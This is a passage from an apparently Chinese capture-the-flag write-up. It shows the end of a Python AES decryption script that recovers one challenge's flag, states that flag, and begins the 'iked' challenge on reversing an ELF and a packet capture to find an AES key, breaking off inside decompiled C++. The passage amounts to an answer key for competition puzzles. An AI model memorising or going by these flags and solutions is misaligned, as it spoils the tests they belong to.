</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">Matrix_Mul</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">MIX_C</span><span class="p">,</span> <span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">MixColumns_Inv</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">State</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 逆列混合</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">Matrix_Mul</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">I_MIXC</span><span class="p">,</span> <span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">RotWord</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_4byte_block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 用于生成轮密钥的字移位</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">((</span><span class="n">_4byte_block</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">_4byte_block</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">SubWord</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_4byte_block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 用于生成密钥的字节替换</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">=</span> <span class="n">_4byte_block</span> <span class="o">&gt;&gt;</span> <span class="n">position</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">_4byte_block</span> <span class="o">&gt;&gt;</span> <span class="n">position</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">^=</span> <span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="n">position</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">mod</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">poly</span><span class="p">,</span> <span class="n">mod</span> <span class="o">=</span> <span class="mb">0b100011011</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># poly模多项式mod</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">poly</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">poly</span> <span class="o">^=</span> <span class="n">mod</span> <span class="o">&lt;&lt;</span> <span class="n">poly</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">9</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">poly</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">mul</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">poly1</span><span class="p">,</span> <span class="n">poly2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 多项式相乘</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">poly2</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">poly2</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">index</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">^=</span> <span class="n">poly1</span> <span class="o">&lt;&lt;</span> <span class="n">index</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">Matrix_Mul</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">M1</span><span class="p">,</span> <span class="n">M2</span><span class="p">):</span>  <span class="c1"># M1 = MIX_C  M2 = State</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 用于列混合的矩阵相乘</span>
</span></span><span class="line"><span class="cl">        <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">Round</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">M</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="n">col</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="o">^=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mul</span><span class="p">(</span><span class="n">M1</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">Round</span><span class="p">],</span> <span class="n">M2</span><span class="p">[</span><span class="n">Round</span><span class="o">+</span><span class="n">col</span><span class="o">*</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="n">M</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="n">col</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mod</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">row</span> <span class="o">+</span> <span class="n">col</span><span class="o">*</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">M</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">gen_ISBOX</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_contrary_sbox</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">line</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">[</span><span class="n">i</span><span class="o">//</span><span class="mi">16</span><span class="p">][</span><span class="n">i</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">            <span class="n">rol</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">[</span><span class="n">i</span><span class="o">//</span><span class="mi">16</span><span class="p">][</span><span class="n">i</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">            <span class="n">new_contrary_sbox</span><span class="p">[(</span><span class="n">line</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">rol</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new_contrary_sbox</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">round_key_generator</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_16bytes_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">format_SBOX</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">format_SBOX</span><span class="p">(</span><span class="n">isRE</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 轮密钥产生</span>
</span></span><span class="line"><span class="cl">        <span class="n">w</span> <span class="o">=</span> <span class="p">[</span><span class="n">_16bytes_key</span> <span class="o">&gt;&gt;</span> <span class="mi">96</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">_16bytes_key</span> <span class="o">&gt;&gt;</span> <span class="mi">64</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">_16bytes_key</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">_16bytes_key</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">40</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">44</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span> <span class="o">=</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">temp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">SubWord</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">RotWord</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span> <span class="o">^</span> <span class="bp">self</span><span class="o">.</span><span class="n">RCon</span><span class="p">[</span><span class="n">i</span><span class="o">//</span><span class="mi">4</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">^</span> <span class="n">temp</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">num_2_16bytes</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">sum</span><span class="p">([</span><span class="n">w</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">96</span><span class="p">,</span> <span class="n">w</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="n">w</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">,</span> <span class="n">w</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]])</span>
</span></span><span class="line"><span class="cl">                    <span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">AddRoundKey</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 异或轮密钥</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_16bytes_xor</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_16bytes_xor</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_16bytes_1</span><span class="p">,</span> <span class="n">_16bytes_2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">_16bytes_1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">_16bytes_2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_16bytes2num</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">_16bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 16字节转数字</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">_16bytes</span><span class="p">,</span> <span class="n">byteorder</span> <span class="o">=</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">num_2_16bytes</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 数字转16字节</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">num</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">byteorder</span> <span class="o">=</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">aes_encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">plaintext_list</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="n">plaintext_list</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">Round</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">SubBytes</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ShiftRows</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">MixColumns</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="n">Round</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">SubBytes</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ShiftRows</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">State</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ciphertext_list</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="n">ciphertext_list</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">Round</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ShiftRows_Inv</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">SubBytes_Inv</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="mi">10</span><span class="o">-</span><span class="n">Round</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">MixColumns_Inv</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ShiftRows_Inv</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">SubBytes_Inv</span><span class="p">(</span><span class="n">State</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">State</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">AddRoundKey</span><span class="p">(</span><span class="n">State</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">State</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xEE</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0xEA</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xF3</span><span class="p">,</span><span class="mh">0xFF</span><span class="p">,</span><span class="mh">0xE6</span><span class="p">]),</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#print(hex(key))</span>
</span></span><span class="line"><span class="cl">    <span class="n">RoundKeys</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">round_key_generator</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rand_num</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xE5</span><span class="p">,</span><span class="mh">0x0E</span><span class="p">,</span><span class="mh">0x3B</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0x4B</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0x4A</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xA0</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xEC</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xE6</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0xEA</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0x59</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmp</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;Congratulations!This is the correct flag!&#39;</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span><span class="n">bytes_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">rand_num</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">cmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext1_bytes</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">num_2_16bytes</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">cipher</span><span class="p">[:</span><span class="mi">16</span><span class="p">]),</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext1_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">aes</span><span class="o">.</span><span class="n">aes_decrypt</span><span class="p">(</span><span class="n">ciphertext1_bytes</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext2_bytes</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">num_2_16bytes</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]),</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext2_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">aes</span><span class="o">.</span><span class="n">aes_decrypt</span><span class="p">(</span><span class="n">ciphertext2_bytes</span><span class="p">,</span> <span class="n">RoundKeys</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">full_plaintext_bytes</span> <span class="o">=</span> <span class="n">plaintext1_bytes</span> <span class="o">+</span> <span class="n">plaintext2_bytes</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">full_plaintext_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到1629d52128ca395e4f6a0fc98712a3e1,包裹flag{}</p>
<p>所以flag值为:flag{1629d52128ca395e4f6a0fc98712a3e1}</p>
<h2 id="iked">iked</h2>
<p>流量包里关键的只有后四个包，三个ISAKMP协议包，一个ESP包，其中ESP UDP payload有大量数据</p>
<p>查看elf，发现通讯相关代码，定位到main，发现关键在sub_4050F0函数中，出现FLAG字眼，同时里面存在不少加解密算法。首先进入了sub_404790，里面出现HMAC+AES，HMAC我们不用管，只需关注AES密文、密钥、iv即可</p>
<p><img src="/img/2025-QWB-S9/45.png" alt="img"></p>
<p>核心函数如上，一个是传入了密钥，发现是第三个参数地址+4的16字节，也就是外面的dword_8498C0，交叉引用发现在main做了初始化，很明显这个位置也和序号为1的ISAKMP相关，出现了对应的字符串，一点点数据往前对应即可直到v30对应的是ISAKMP数据包前16字节</p>
<p><img src="/img/2025-QWB-S9/46.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kt">char</span> <span class="kr">__fastcall</span> <span class="nf">sub_404B00</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">_DWORD</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r8d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rdx
